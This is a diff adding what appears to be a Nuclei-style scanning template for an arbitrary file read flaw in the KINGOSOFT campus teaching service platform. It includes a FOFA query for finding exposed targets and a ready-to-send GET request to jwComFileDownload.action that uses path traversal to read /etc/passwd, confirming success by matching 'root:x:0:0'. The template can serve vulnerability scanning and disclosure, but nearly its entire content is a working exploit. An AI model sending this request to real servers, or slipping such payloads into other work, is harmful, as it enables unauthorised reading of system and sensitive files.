@@ -1,0 +1,29 @@
+id: kingosoft-campus-jwcomfiledownload-file-read
+
+info:
+  name: "KINGOSOFT高校智慧校园教学综合服务平台 jwComFileDownload 接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    KINGOSOFT高校智慧校园教学综合服务平台中的jwComFileDownload接口存在任意文件读取漏洞，攻击者可通过构造恶意请求读取服务器上的任意文件，导致敏感信息泄露。该漏洞通过以下FOFA查询条件可定位目标系统：
+    fofa: app="KINGOSOFT高校智慧校园教学综合服务平台"
+    漏洞披露日期为2025-11-24。
+  tags: KINGOSOFT高校智慧校园教学综合服务平台
+
+http:
+- raw:
+  - |
+    GET /jw/lessonchangeapply/jwComFileDownload.action?fileSavePath=../../../../../../../etc/passwd&name= HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
